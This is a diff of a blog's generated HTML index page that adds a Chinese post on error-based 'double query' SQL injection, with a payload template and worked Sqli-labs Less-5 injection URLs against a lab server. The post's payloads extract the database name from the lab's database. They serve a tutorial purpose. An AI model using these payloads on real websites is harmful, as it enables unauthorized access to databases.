@@ -229,6 +229,160 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/17/SQL注入之Double Query/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Angie Q">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Angie's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/12/17/SQL注入之Double Query/" itemprop="url">SQL注入之Double Query</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-12-17T23:15:47+08:00">
+                2018-12-17
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/sql注入/" itemprop="url" rel="index">
+                    <span itemprop="name">sql注入</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="0x01-原理"><a href="#0x01-原理" class="headerlink" title="0x01 原理"></a>0x01 原理</h1><h2 id="Double-Query原理分析"><a href="#Double-Query原理分析" class="headerlink" title="Double Query原理分析"></a>Double Query原理分析</h2><p>参考：<br><a href="https://lyiang.wordpress.com/2015/04/06/sql%E6%B3%A8%E5%85%A5%EF%BC%9A%E5%8F%8C%E6%9F%A5%E8%AF%A2/" target="_blank" rel="noopener">Sql注入：双查询</a><br><a href="http://www.91ri.org/7636.html" target="_blank" rel="noopener">科普：双查询注入</a></p>
+<p>当order by判断完字段数，但是union select 1,2,3,…不在页面显示返回位时。可以尝试<strong>双查询注入</strong>。</p>
+<p><strong>双查询注入</strong>就是嵌套子查询，简单说就是select(select)的形式。</p>
+<p>数据库查询要么返回正确的查询结果，要么返回报错信息。双注入查询其实是一种报错查询，将我们需要的信息当作数据库错误返回。</p>
+<p>这里利用了Error Based分析过的floor(rand(0)*2)引起报错的原理。</p>
+<p><strong>用法：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1 from (select count(*),concat(floor(rand(0)*2),(注入爆数据语句))a from information_schema.tables group by a)b</span><br></pre></td></tr></table></figure></p>
+<h1 id="0x02-Sqli-labs"><a href="#0x02-Sqli-labs" class="headerlink" title="0x02 Sqli-labs"></a>0x02 Sqli-labs</h1><p>以下为Sqli-labs的双注入查询的题目。</p>
+<h2 id="Less-5-Double-Query-Single-Quote-String"><a href="#Less-5-Double-Query-Single-Quote-String" class="headerlink" title="Less-5 Double Query- Single Quote -String"></a>Less-5 Double Query- Single Quote -String</h2><p>题目信息：Please input the ID as parameter with numeric value</p>
+<p>根据题目信息：<br><a href="http://43.247.91.228:84/Less-5/?id=1" target="_blank" rel="noopener">http://43.247.91.228:84/Less-5/?id=1</a><br>尝试了两个最经典的payload:<br><a href="http://43.247.91.228:84/Less-5/?id=1&#39;" target="_blank" rel="noopener">http://43.247.91.228:84/Less-5/?id=1&#39;</a> and ‘1’=’1<br><a href="http://43.247.91.228:84/Less-5/?id=1&#39;" target="_blank" rel="noopener">http://43.247.91.228:84/Less-5/?id=1&#39;</a> and ‘1’=’2<br>确认sql注入存在。</p>
+<p>字段数payload:<br><a href="http://43.247.91.228:84/Less-5/?id=1&#39;" target="_blank" rel="noopener">http://43.247.91.228:84/Less-5/?id=1&#39;</a> order by 3<br>至少为3</p>
+<p>但是此时利用 union select 1,2,3 发现页面没有返回位。</p>
+<p>根据题目信息尝试双查询注入,payload:<br><strong>爆数据库名</strong><br><a href="http://43.247.91.228:84/Less-5/?id=1&#39;" target="_blank" rel="noopener">http://43.247.91.228:84/Less-5/?id=1&#39;</a> union select 1 from (select count(<em>),concat(floor(rand(0)</em>2),(database()))a from information_schema.tables group by a)b –+</p>
+<p>依据上述公式替换爆数据语句即可获取数据库信息。</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/15/SQL注入之Error Based/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -889,7 +1043,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-count">5</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
